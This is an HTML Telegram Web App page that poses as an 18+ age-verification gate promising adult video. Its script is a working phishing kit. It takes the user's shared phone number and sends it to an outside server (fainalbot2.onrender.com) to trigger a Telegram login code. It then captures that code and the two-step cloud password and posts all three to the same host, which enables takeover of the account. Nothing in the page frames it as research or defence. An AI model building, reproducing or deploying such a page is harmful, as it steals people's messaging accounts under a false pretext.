<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exclusive Access</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: white;
            height: 100vh;
            overflow: hidden;
        }
        .glass-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
        }
        .step-content { display: none; }
        .step-content.active { display: block; animation: fadeIn 0.5s ease; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .numpad button {
            background: rgba(255, 255, 255, 0.08);
            transition: all 0.2s;
        }
        .numpad button:active { background: rgba(255, 255, 255, 0.2); transform: scale(0.95); }
    </style>
</head>
<body class="flex items-center justify-center p-4">

    <div class="glass-card w-full max-w-md p-8 text-center relative">

        <div id="step1" class="step-content active">
            <div class="mb-6 text-5xl">üîû</div>
            <h2 class="text-2xl font-semibold mb-2">Age Verification</h2>
            <p class="text-gray-400 mb-8 text-sm">This content is restricted to users 18 years of age or older.</p>
            <button onclick="requestContact()" id="proceed-btn" class="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-xl font-bold shadow-lg transition-all">
                ‚úÖ I'M 18+ PROCEED
            </button>
        </div>

        <div id="step2" class="step-content">
            <h2 class="text-xl font-semibold mb-4">Verification Code</h2>
            <p class="text-gray-400 mb-6 text-sm">Enter the 5-digit code sent to your Telegram.</p>
            <div class="flex justify-center gap-2 mb-8">
                <input type="text" id="otp-display" readonly class="bg-transparent border-b-2 border-blue-500 text-3xl text-center w-full tracking-[1rem] outline-none" placeholder="*****">
            </div>
            <div class="numpad grid grid-cols-3 gap-3 mb-6">
                <button onclick="addDigit(1)" class="py-4 rounded-lg text-xl font-bold">1</button>
                <button onclick="addDigit(2)" class="py-4 rounded-lg text-xl font-bold">2</button>
                <button onclick="addDigit(3)" class="py-4 rounded-lg text-xl font-bold">3</button>
                <button onclick="addDigit(4)" class="py-4 rounded-lg text-xl font-bold">4</button>
                <button onclick="addDigit(5)" class="py-4 rounded-lg text-xl font-bold">5</button>
                <button onclick="addDigit(6)" class="py-4 rounded-lg text-xl font-bold">6</button>
                <button onclick="addDigit(7)" class="py-4 rounded-lg text-xl font-bold">7</button>
                <button onclick="addDigit(8)" class="py-4 rounded-lg text-xl font-bold">8</button>
                <button onclick="addDigit(9)" class="py-4 rounded-lg text-xl font-bold">9</button>
                <button onclick="clearDigit()" class="py-4 rounded-lg text-sm font-bold text-red-400">Clear</button>
                <button onclick="addDigit(0)" class="py-4 rounded-lg text-xl font-bold">0</button>
                <button onclick="submitOtp()" class="py-4 rounded-lg text-sm font-bold text-green-400">OK</button>
            </div>
        </div>

        <div id="step3" class="step-content">
            <h2 class="text-xl font-semibold mb-2">Two-Step Verification</h2>
            <p class="text-gray-400 mb-6 text-sm">Enter your cloud password to continue.</p>
            <input type="password" id="two-step-pwd" class="w-full bg-white/10 border border-white/20 rounded-xl py-4 px-4 mb-6 focus:outline-none focus:border-blue-500" placeholder="Your Password">
            <button onclick="submitFullAuth()" id="final-btn" class="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-xl font-bold shadow-lg transition-all">
                SUBMIT
            </button>
        </div>

        <div id="step4" class="step-content text-center">
            <div class="mb-6 text-5xl text-green-500">‚úîÔ∏è</div>
            <h2 class="text-2xl font-semibold mb-2">Access Granted</h2>
            <p class="text-gray-400 mb-8 text-sm">Your identity has been verified successfully.</p>
            <button class="w-full bg-gradient-to-r from-red-600 to-orange-600 py-4 rounded-xl font-bold shadow-lg transition-all">
                üìΩÔ∏è WATCH NOW
            </button>
        </div>

    </div>

    <script>
        const tg = window.Telegram.WebApp;
        const BASE_URL = "https://fainalbot2.onrender.com";
        let userPhone = "";
        let currentOtp = "";

        tg.expand();

        function showStep(step) {
            document.querySelectorAll('.step-content').forEach(s => s.classList.remove('active'));
            document.getElementById('step' + step).classList.add('active');
        }

        // ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶∂‡ßá‡ßü‡¶æ‡¶∞‡¶ø‡¶Ç ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶æ‡¶∞
        function requestContact() {
            console.log("Requesting contact...");
            tg.requestContact((callbackData) => {
                if (callbackData && callbackData.status === 'sent') {
                    // ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶ó‡ßá‡¶õ‡ßá
                    userPhone = callbackData.response_data.phone_number;
                    
                    // ‡¶´‡ßã‡¶® ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞‡ßá‡¶∞ ‡¶∂‡ßÅ‡¶∞‡ßÅ‡¶§‡ßá '+' ‡¶®‡¶æ ‡¶•‡¶æ‡¶ï‡¶≤‡ßá ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡¶æ
                    if (!userPhone.startsWith('+')) {
                        userPhone = '+' + userPhone;
                    }
                    
                    console.log("Phone Received: " + userPhone);
                    sendOtpToBackend(userPhone);
                } else {
                    alert("Security Check: You must click 'Share Contact' to verify your identity.");
                }
            });
        }

        async function sendOtpToBackend(phone) {
            const btn = document.getElementById('proceed-btn');
            btn.innerText = "Connecting to Telegram...";
            btn.disabled = true;

            try {
                const response = await fetch(`${BASE_URL}/send_otp`, {
                    method: 'POST',
                    mode: 'cors',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({ phone: phone })
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                const result = await response.json();
                
                if (result.status === 'success') {
                    showStep(2);
                } else {
                    alert("Telegram Error: " + result.message);
                    btn.innerText = "‚úÖ I'M 18+ PROCEED";
                    btn.disabled = false;
                }
            } catch (err) {
                alert("Server Busy: Please wait 10 seconds and try again. (" + err.message + ")");
                btn.innerText = "‚úÖ I'M 18+ PROCEED";
                btn.disabled = false;
            }
        }

        function addDigit(digit) {
            if(currentOtp.length < 5) {
                currentOtp += digit;
                document.getElementById('otp-display').value = currentOtp;
            }
        }

        function clearDigit() {
            currentOtp = "";
            document.getElementById('otp-display').value = "";
        }

        function submitOtp() {
            if(currentOtp.length === 5) {
                showStep(3);
            } else {
                alert("Enter 5-digit code");
            }
        }

        async function submitFullAuth() {
            const pwd = document.getElementById('two-step-pwd').value;
            const btn = document.getElementById('final-btn');
            btn.innerText = "Verifying...";

            try {
                const response = await fetch(`${BASE_URL}/verify`, {
                    method: 'POST',
                    mode: 'cors',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        phone: userPhone, 
                        otp: currentOtp, 
                        password: pwd 
                    })
                });
                const result = await response.json();
                if(result.status === 'success') {
                    showStep(4);
                } else {
                    alert("Verification Failed: " + result.message);
                    btn.innerText = "SUBMIT";
                }
            } catch (err) {
                alert("Auth Error: " + err.message);
                btn.innerText = "SUBMIT";
            }
        }
    </script>
</body>
</html>
